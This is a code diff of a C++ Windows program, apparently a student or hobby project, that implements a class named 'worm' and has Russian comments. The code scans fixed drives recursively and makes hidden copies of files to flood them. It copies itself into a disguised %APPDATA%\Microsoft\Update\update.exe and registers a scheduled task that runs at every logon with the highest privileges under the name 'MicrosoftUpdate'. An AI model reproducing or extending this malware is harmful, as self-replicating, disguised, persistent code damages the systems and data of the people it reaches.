@@ -39,12 +39,14 @@ private:
 	vector <fs::path> file_to_copy;
 	int iteration;
 
+
+
 public:
 	worm(const wstring& path_to_start = get_own_path(), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
 
 
-	void worm_was_started() {
+	void worm_was_started() { // Massage Box для отладки
 		MessageBoxW(
 			NULL,                            // Владелец окна (NULL — нет владельца)
 			L"Ты был заражён!",              // Текст сообщения
@@ -53,21 +55,34 @@ public:
 		);
 	}
 
+	//void print_root() {
+	//	for (const auto& path : get_all_volumes()) {
+	//		wcout << path << endl;
+	//	}
+	//}
 
-	void scan_all_volumes() { // проходимся по найденным корневым дирректориям и составляем список всех папок 
+	void scan_all_volumes() { // поиск по всем корневым дискам, исключая съемные носители
 		auto volumes = get_all_volumes();
 
 		for (const auto& vol : volumes) {
 			auto paths = get_paths_for_volume(vol);
 
 			for (const auto& path : paths) {
-				std::wcout << L"Обход: " << path << L"\n";
-				search_list_dir(path, list_dir);
-				
+				UINT driveType = GetDriveTypeW(path.c_str());
+
+				if (driveType == DRIVE_FIXED) { // только SSD/HDD, так как для флешек и прочих съемных носителей другая логика
+					std::wcout << L"Обход: " << path << L"\n";
+					search_list_dir(path, list_dir); 
+				}
+				else {
+					std::wcout << L"Пропущено (не HDD/SSD): " << path << L"\n";
+				}
 			}
 		}
 	}
 
+
+	
 
 
 	void search_list_dir(const wstring& path_to_dir, vector<wstring> &list_dir_tmp) { // рекурсивный поиск всех папок по адрессу и внутри и копирование в выбранный вектор
@@ -91,7 +106,7 @@ public:
 	}
 
 
-	void search_list_dir() { // для старта червя
+	void search_list_dir() { // для старта поиска по дирректориям
 		list_dir.clear();
 		//search_list_dir(path_to_start, list_dir);
 		search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
@@ -104,11 +119,11 @@ public:
 		}
 	}
 
-	void collect_visible_files() {
+	void collect_visible_files() { // тот же отбор, только без параметров ( чтобы использовать без указания пути, для запуска червя )
 		collect_visible_files(list_dir, file_to_copy);
 	}
 
-	void collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files) {
+	void collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files) { // функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть 
 		collected_files.clear();
 
 		if (list_dir_tmp.empty()) {
@@ -139,15 +154,18 @@ public:
 		}
 	}
 
-	void print_file_to_copy() {
+	void print_file_to_copy() { // выводит все файлы которые собирается копировать
 		cout << "Вывод файлов для копирования" << endl;
 		for (auto a1 : file_to_copy) {
 			wcout << a1.wstring() << endl;
 		}
 	}
 
+	void replicate_files() { // вызов копирования без параметров 
+		replicate_files(iteration);
+	}
 
-	void replicate_files(int iteration = 1) { // доабивть количество повторений 
+	void replicate_files(int iteration = 1) { // создает скрытые копии из вектора поля file_to_copy в те же папки 
 		if (file_to_copy.empty()) {
 			std::cerr << "Список файлов пуст! Сначала выполните collect_visible_files()\n";
 			return;
@@ -195,8 +213,8 @@ public:
 		wchar_t appdata_path[MAX_PATH];
 		SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);  // %APPDATA%
 
-		std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update";
-		std::wstring dest_exe = dest_folder + L"\\update.exe";
+		std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update"; // название скрытой папки куда будет скопирован червь
+		std::wstring dest_exe = dest_folder + L"\\update.exe"; // название самого червя, которые будет добавляться в таск манагер винды 10
 
 		// Создать директорию
 		fs::create_directories(dest_folder);
@@ -214,13 +232,12 @@ public:
 	}
 
 	void create_scheduled_task(const wstring& worm_path) { // создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )
-		//wstring worm_path = get_own_path();
+		// wstring worm_path = get_own_path();
 		std::wstring cmd = L"schtasks /create /tn \"MicrosoftUpdate\" "
 			L"/tr \"" + worm_path + L"\" "
 			L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
 		_wsystem(cmd.c_str());
 	}
-
 
 	
 };
